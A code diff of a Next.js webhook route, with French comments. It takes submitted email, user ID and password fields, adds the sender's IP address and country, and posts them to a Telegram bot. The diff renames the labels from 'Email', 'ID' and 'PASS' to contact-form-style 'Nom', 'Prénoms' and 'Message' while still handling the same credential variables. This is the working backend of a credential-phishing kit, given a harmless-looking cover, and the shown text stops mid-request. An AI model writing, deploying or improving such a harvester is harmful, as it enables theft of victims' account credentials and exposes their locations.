@@ -1,19 +1,13 @@
-// pages/api/webhook.js
 export default async function handler(req, res) {
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
 
-  if (req.method === "OPTIONS") {
-    return res.status(200).end();
-  }
-
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Méthode non autorisée" });
-  }
+  if (req.method === "OPTIONS") return res.status(200).end();
+  if (req.method !== "POST") return res.status(405).json({ error: "Méthode non autorisée" });
 
   try {
-    const { email, motDePasse } = req.body || {};
+    const { usermail, user, pass } = req.body || {};
 
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.CHAT_ID;
@@ -23,34 +17,28 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: "Configuration serveur incomplète" });
     }
 
-    // --- 1. Obtenir l'IP du client
-    const ip =
-      req.headers["x-forwarded-for"]?.split(",")[0] ||
-      req.socket?.remoteAddress ||
-      "IP inconnue";
+    // --- Obtenir IP du client
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress || "IP inconnue";
 
-    // --- 2. Appeler une API pour obtenir le pays
+    // --- Obtenir pays via IP
     let country = "Inconnu";
     try {
       const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
       const geoData = await geoRes.json();
-      if (geoData && geoData.country) {
-        country = geoData.country;
-      }
+      if (geoData?.country) country = geoData.country;
     } catch (e) {
       console.warn("Impossible d'obtenir le pays via IP");
     }
 
-    // --- 3. Créer le message formaté
+    // --- Créer message Telegram
     const message = `Nouvelle soumission :
 🌍 IP : ${ip} (${country})
-📧 Email : ${usermail}
-📧 ID : ${user}
-🔑 PASS : ${pass}`;
+👤 Nom : ${usermail}
+👥 Prénoms : ${user}
+💬 Message : ${pass}`;
 
-    // --- 4. Envoyer le message à Telegram
+    // --- Envoyer message à Telegram
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
     const telegramResponse = await fetch(telegramUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
